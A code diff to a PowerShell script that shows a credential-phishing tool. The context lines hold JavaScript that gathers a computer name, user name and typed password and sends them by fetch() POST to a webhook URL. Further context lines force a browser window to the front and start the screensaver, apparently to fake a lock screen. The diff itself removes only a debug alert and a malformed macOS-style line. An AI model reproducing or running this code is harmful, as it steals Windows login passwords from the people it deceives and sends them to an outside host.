@@ -173,7 +173,6 @@ $h2 = @"
       var webhookUrl = "$dc";
       var uValue = "$u";
       var cValue = "$c";
-      alert($u)
       var data = {content: "Computer: " + cValue + " | User: " + uValue + " | Password: " + passwordValue};
       fetch(webhookUrl, {
         method: 'POST',
@@ -235,4 +234,3 @@ Sleep -Milliseconds 250
 $null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
 Sleep -Milliseconds 250
 $black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
-oascript -e 'set volume 7' &&killall Terminal
